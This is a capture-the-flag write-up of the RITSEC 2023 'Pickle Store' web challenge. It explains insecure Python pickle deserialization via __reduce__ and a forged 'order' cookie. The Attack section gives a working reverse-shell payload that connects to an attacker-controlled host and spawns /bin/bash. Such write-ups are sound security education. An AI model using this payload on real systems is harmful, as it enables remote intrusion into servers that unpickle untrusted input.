# Pickle Store (RITSEC 2023 - Web)

**Challenge description**: "New pickles just dropped! Check out the store."<br>
**Challenge date**: ven, 31 Mar. 2023, 16:00 UTC — dom, 02 Apr. 2023, 16:00 UTC<br>
**Challenge points**: 223<br>

## Involved Vulnerability

The server of this challenge uses the Python module called *pickle*, which is used for serializing (“*Pickling*”) and de-serializing (“*Unpickling*”) Python objects' structure (see [[1]](#1)). This module is vulnerable to RCE during unpickling of class instances (objects). Classes can be defined to contain methods that can be called during unpickling process. One of these methods is *\_\_reduce()\_\_*.<br>
As evidenced by [[1]](#1):<br>

>The \_\_reduce\_\_() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”).<br>
If a string is returned, the string should be interpreted as the name of a global variable. \[...\]<br>
When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order:<br> - A **callable object** that will be called to create the initial version of the object.<br> - A **tuple of arguments** for the callable object. An empty tuple must be given if the callable does not accept any argument.<br> - \[...\]

A Python function is a callable object. So, if the attacker defines a class like the one below, pickles its instance and send the pickled object to the server, this will execute the specified function with the parameters given in the tuple.
```python
class RCE:
    def __reduce__():
        return (function_name, (parameter_1,parameter_2,)) #if there is only 1 parameter: (parameter_1,)
```
## Exploring the challenge
This is the first thing the user see as soon as he/she accesses the challenge:

![Pickle Store](https://user-images.githubusercontent.com/66698256/229376712-d235bbbb-0d59-4c3d-a9e0-ab0829107127.png)

If the user clicks on one of the buttons (the first one, for example), he/she will be redirected to <code>/order</code>:

![Order executed](https://user-images.githubusercontent.com/66698256/229377403-7b7e14fd-62dd-46fd-9b15-5188b734f11d.png)

Clicking on the "New Order" button the user will be redirected to the initial page. By inspecting the four buttons something interesting can be noticed:

![Cookie setting](https://user-images.githubusercontent.com/66698256/229377514-b38166dd-aa58-412f-866b-9b865f722abc.png)

When a button is clicked, a cookie called "*order*" is set to a pickled string and sent to the server through a GET request to <code>/order</code>. Here the pickled string is presumably read from the cookie, decoded, unpickled and ultimately printed into the returned page. Thanks to this cookie the server knows which article (or pickle) the user "has chosen to buy".<br>
If we take the cookie value defined in the event handler of the "Sweet Pickle" button, decode it and unpickle it, we'll understand better how all this works.

![Unpickling](https://user-images.githubusercontent.com/66698256/229381958-d871524b-304f-4e3b-932b-790bd8eba284.png)

As expected, the string obtained ("*sweetpickle*") is the same visualized in the <code>/order</code> page.<br>
The user can create any pickled object and set the "*order*" cookie accordingly. This object will be unpickled by the server and, somehow, printed on the <code>/order</code> page.

![Pickling](https://user-images.githubusercontent.com/66698256/229382473-c062a8e3-a07e-4b39-8ee6-72cf397041aa.png)

![Set forged cookie](https://user-images.githubusercontent.com/66698256/229382220-2c6b25ef-d00e-4681-8267-fa8c751e4892.png)

![AAAA](https://user-images.githubusercontent.com/66698256/229378762-be51dd0c-33b0-40c2-abcf-c1b41e340fde.png)


## Attack

The behaviour to be exploited is the insecure unpickling (or insecure deserialization) of particular pickled objects. What the application does with the output of the deserialization is of no interest to the attacker. A way to exploit the involved vulnerability was to spawn a reverse shell on the server through Python code.

```python
host="IP_Address"
port="PORT"
class RCE:
    def __reduce__():
        #define code here won't work
        return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
```
Variables <code>host</code> and <code>port</code> contain, respectively, the IP address and the port on which the attacker will listen for the spawned reverse shell. 

## References
<a id="1" target="_blank">[1]</a> 
https://docs.python.org/3/library/pickle.html


